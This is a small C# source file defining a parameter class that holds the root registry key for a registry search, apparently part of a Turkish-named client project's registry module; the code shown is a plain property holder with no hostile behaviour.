using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Enumlar;

namespace xClient.KuuhakuÇekirdek.KayıtDefteri
{
    public class RegistrySeekerParams
    {
        public RegistryKey RootKey { get; set; }

        public RegistrySeekerParams(RegistryKey registryKey)
        {
            this.RootKey = registryKey;
        }
    }
}
